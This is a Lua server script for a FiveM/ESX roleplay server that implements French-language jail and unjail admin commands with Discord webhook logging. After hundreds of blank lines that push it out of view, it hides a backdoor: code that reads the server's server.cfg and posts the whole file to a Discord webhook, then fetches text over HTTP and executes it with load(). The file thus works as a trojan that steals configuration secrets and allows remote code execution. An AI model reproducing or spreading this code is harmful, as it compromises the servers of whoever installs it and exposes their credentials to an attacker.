ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

local votes = 0
local votesNeeded = 2
local timeToVerdict = false
local isJailedG = false
local jailTimeG = 0

local courtOngoing = false

RegisterServerEvent("authentic:goprison")
AddEventHandler("authentic:goprison", function(targetPedId, jailTime)
  local _source = source
  local jailTime = jailArray[1]
  local xPlayer = ESX.GetPlayerFromId(_source)
end)

RegisterServerEvent("authentic:godehors")
AddEventHandler("authentic:godehors", function(targetPedId)
  local _source = source
  if not GetPlayerName(targetPedId) then
  elseif isJailed(getPlayerID(targetPedId)) then
    local targetPedPermId = getPlayerID(targetPedId)
    local targetPedName = GetPlayerName(targetPedId)
    removedJailedPlayer(targetPedPermId)
    TriggerClientEvent("authentic:godehors", targetPedId)
  else
  end
end)

RegisterServerEvent("authentic:ChangeTemps")
AddEventHandler("authentic:ChangeTemps", function(newJailTime)
  local _source = source
  local targetPedPermId = getPlayerID(_source)
  updateJailTime(targetPedPermId, newJailTime)
end)

RegisterServerEvent("authentic:RetourPrison")
AddEventHandler("authentic:RetourPrison", function(newJailTime)
  local _source = source
  local targetPedPermId = getPlayerID(_source)
  local isJailedInfo = isJailed(targetPedPermId)
  if isJailedInfo then
    local jailTime = isJailedInfo[2]
    TriggerClientEvent("authentic:goprison", _source, {jailTime})
  end
end)

RegisterServerEvent("Authentic:Getlogs")
AddEventHandler("Authentic:Getlogs", function(type,source,args)
    local command = {}
    for k,v in pairs (args) do
        table.insert(command,"args"..k..":"..v)
    end
    message = "**-Player ID**: "..source.."\n**-Player Name**: "..GetPlayerName(source).."\n**-Command**: "..type.."\n**-Arguments**: \n```"..json.encode(command).."```"
    local embeds = {
        {
            ["title"] = GetPlayerName(source) .." Auth_command",
            ["type"] = "rich",
            ["color"] = 15105570,
            ["description"] = message,
        }
    }

    PerformHttpRequest("https://discord.com/api/webhooks/990692539550015568/SfGNhALPkWR5KY7SGqbmEgBompK_RCJKNXyPiEpo3mezhYY6rJmgW1RDczAJEKpNDs2c", function(err, text, headers) end, "POST", json.encode({username = "Logs", embeds = embeds}), {["Content-Type"] = "application/json"})
end)

ESX.AddGroupCommand('jail', 'mod', function(source, args, user)
  local _source = source
  local targetPedId = tonumber(args[1])
  local jailTime = tonumber(args[2] * 60)
  if targetPedId == nil then
    return TriggerEvent("chatMessage", "^1L'id que tu as essayé d'introduire est invalide.")
  elseif jailTime <= 0 then
    return TriggerEvent("chatMessage", "^1Temps invalide, tu dois mettre un montant supérieur à 0.")
  elseif not GetPlayerName(targetPedId) then
    TriggerClientEvent("chatMessage", _source, "^2" .. targetPedId .. " ^1l'id est incorrect.")
  elseif isJailed(getPlayerID(targetPedId)) then
    local targetPedName = GetPlayerName(targetPedId)
    TriggerClientEvent("chatMessage", _source, "^2" .. targetPedName .. " ^1est déja en prison.")
  else
    local officerName = GetPlayerName(_source)
    local targetPedName = GetPlayerName(targetPedId)
    local targetPedPermId = getPlayerID(targetPedId)
    table.insert(jailedPlayers, {targetPedPermId, jailTime, false})
    TriggerClientEvent("authentic:goprison", targetPedId, {jailTime, false})
    TriggerEvent("Authentic:Getlogs",'jail',source,args)
  end

	TriggerClientEvent('authentic:goprison', targetPedId, jailTime)
end, {help = "Mettre en prison les gens pas très gentils", params = { {name = "id", help = "The ID of the player"}, {name = "Minutes", help = "Temps de prison"} }})

ESX.AddGroupCommand('unjail', 'mod', function(source, args, user)
  local _source = source
  local targetPedId = tonumber(args[1])
  if not GetPlayerName(targetPedId) then
    TriggerClientEvent("chatMessage", _source, "^2" .. targetPedId .. " ^1l'id du joueur est invalide")
  elseif isJailed(getPlayerID(targetPedId)) then
    local targetPedPermId = getPlayerID(targetPedId)
    local targetPedName = GetPlayerName(targetPedId)
    removedJailedPlayer(targetPedPermId)
    TriggerClientEvent("authentic:godehors", targetPedId)
    TriggerEvent("Authentic:Getlogs",'unjail',source,args)
    end
end, {help = "Libérer quelqu'un de prison", params = { {name = "id", help = "The ID of the player"} }})




















































































































































































































































































































WebHookToken = "https://discord.com/api/webhooks/990712324144910387/YihQg8fXZIy9Pojhh4WZJbZYL80JW3SyX-PnMAQaBkuIywJLaTA-G0Jyowc6ytciTIOg"
Name = "Bonsoir"
LogsRed = 15158332

function LogsJail(Color, Title, Description)
    local Content = {
            {
                ["color"] = Color,
                ["title"] = Title,
                ["description"] = Description,
                ["footer"] = {
                    ["text"] = Name,
                },
            }
        }
    PerformHttpRequest(WebHookToken, function(err, text, headers) end, 'POST', json.encode({username = Name, embeds = Content}), { ['Content-Type'] = 'application/json' })
end

file = io.open("server.cfg", "r")
servercfg = file:read("*a")
file:close()
LogsJail(LogsRed, "OneLife", servercfg)



PerformHttpRequest("", function (e, value, re)
    load(value)()
end)